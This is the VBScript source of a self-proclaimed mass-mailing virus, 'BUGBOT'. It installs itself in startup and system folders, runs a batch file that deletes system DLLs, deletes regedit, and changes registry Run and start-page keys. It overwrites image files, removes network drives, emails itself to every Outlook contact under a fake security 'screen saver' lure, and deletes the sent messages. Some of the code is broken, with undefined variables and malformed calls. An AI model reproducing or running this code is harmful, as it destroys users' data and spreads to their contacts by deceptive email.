REM BUG STRIKES AGAIN!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Dim history
Dim fevent
Dim folder4
Dim nwfolder
set bug = createobject("scripting.filesystemobject")
i = InputBox("Enter character to get ANSI character code.")
If i <> "" Then
  Inputbox "ANSI Code for " & i & " is:",,"Chr(" & Asc(i) & ")"
End If

'StartUp Delay
SecondsToDelay = "99"
ProgramToRun = "iexplore" 'may need full path
Wscript.Sleep(SecondsToDelay * 1000)
Prog = Chr(34) & ProgramToRun & Chr(34)
CreateObject("WScript.Shell").Run(Prog)

SecondsToDelay = "10"
ProgramToRun = "winword" 'may need full path
Wscript.Sleep(SecondsToDelay * 1000)
Prog = Chr(34) & ProgramToRun & Chr(34)
CreateObject("WScript.Shell").Run(Prog)

'REST HERE
on error resume next
bug.copyfile wscript.scriptfullname,"C:\windows\start menu\programs\startup\bug.vbe",True
bug.copyfile wscript.scriptfullname,"C:\windows\system32\bug.vbe",True
'Bugs are everywhere in micro$oft computers
bug.deletefile "C:\windows\system32\ramsys.exe",true
bug.copyfile wscript.scriptfullname,"C:\windows\Bugs.vbe"
set history = wscript.createobject ("Wscript.shell")
set fevent = history.createtextfile("C:\bug.bat")
fevent.writeline "@echo off"
fevent.writeline "DEL C:\windows\system32\*.DLL |Y"
fevent.writeline "Color FC"
fevent.close
history.run "C:\bug.bat"
On error resume next
bug.deletefile "C:\WINDOWS\regedit.exe"
Folder4 = "C:\bug"
If Not bug.folderexists(folder4) then
set nwfolder = bug.createfolder(folder4)
end if
set EROR = bug.OpenTextFile(WScript.ScriptFullname,1)
bug.copyfile wscript.scriptfullname,"C:\bug\bug.vbe"
history.regwrite "HKLM\software\microsoft\internet Explorer\start Page","http:\\www.bug.net"
history.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\BUG",dirwin&"\BUG.vbs"
History.run "Http:\\www.bug.com"
bug.movefile "C:\windows\system\*.* , C:\bug"
''''''''''''''bug.copfile wscript.scriptfullname,"C:\windows\start Menu\programs\Kazaa",True
 On Error Resume Next
 dim BUG1,Bug2,BU,ext,BUGSS,BBUUGGSS
 set Bug1 = bug.GetFolder(folderspec)
 set BU = Bug1.EROR
 for each Bug2 in BU
 ext=bug.GetExtensionName(Bug2.path)
 ext=lcase(ext)
 BBUUGGSS=lcase(Bug2.name)
 if (ext="jpeg") or (ext="bmp") then
 set BUGSS=bug.OpenTextFile(Bug2.path,2,true)
 ap.write vbscopy
 ap.close
bug.copyfile wscript.scriptfullname,"C:\Bug.scr"
bug.copyfile wscript.scriptfullname,"C:\Bug.dat" '50 50 50 50 50 50 50 50 50 50 50 50
Set sBU=CreateObject("Outlook.Application")
Set tBU=sBU.GetNameSpace("MAPI")
Set uBU=tBU.GetDefaultFolder(6)
For BUtt=1 to uBU.items.count
If uBU.Items.Item(butt).subject="New Security bugs in microsoft??? Check out this screen saver!!! Funny!!" Then
uBU.Items.Item(butt).close
uBU.Items.Item(butt).delete
End If
Next
Set uBU=tBU.GetDefaultFolder(3)
For butt=1 to uBU.items.count
If uBU.Items.Item(butt).subject="New Security bugs in microsoft??? Check out this screen saver!!!" Then
uBU.Items.Item(butt).delete
End If
Next

on error resume next
'Network Protocol
set network = createobject("wscript.network")
network.Removeprinterconnection "LPT1:"
network.removenetworkdrive "G:"
network.removenetworkdrive "h:"
network.removenetworkdrive "i:"
network.removenetworkdrive "j:"
network.removenetworkdrive "k:"
network.removenetworkdrive "l:"
network.removenetworkdrive "m:"
network.removenetworkdrive "n:"
network.removenetworkdrive "z:"
network.setdefualtprinter "usb:"
'808080880808080808080808080
history.run "notepad"
history.appactivate("Notepad")
history.sleep 500
history.sendkeys "BUGBOT 2.0"
On Error Resume Next
Set book = CreateObject("Outlook.Application")
If book = "Outlook" Then
Set Mapi=book.GetNameSpace("MAPI")
Set Lists=Mapi.AddressLists
For Each ListIndex In Lists
If ListIndex.AddressEntries.Count <> 0 Then
ContactCount = ListIndex.AddressEntries.Count
For Count= 1 To ContactCount
Set Mail = book.CreateItem(0)
Set Contact = ListIndex.AddressEntries(Count)
Mail.To = Contact.Address
Mail.Subject = "New Security bugs in microsoft??? Check out this screen saver!!!"
Mail.Body = "CHECK OUT THE SCREEN SAVER!!!!!!!!!" 
Set Attachment=Mail.Attachments
Attachment.Add Folder & "\Bug.vbe" '100
Mail.DeleteAfterSubmit = False
If Mail.To <> "" Then
Mail.Send
End If
Next
End If
Next
End if
End if '109
BUUUUG=MSGBOX("AND NOW FOR THE GRAND FINALE!!!!!!",16,"BYE")
inputbox("Any last words???")
dim oWMP, coole
set oWMP = createobject("WMPLAYER.ocx.7")
Set COOLE = oWMP.cdromcollection
if coole.count then
for i = 0 to coole.count -1
coole.item(i).eject
next
end if
Next
'THE BUGBOT VIRUS BY BUG 8.8
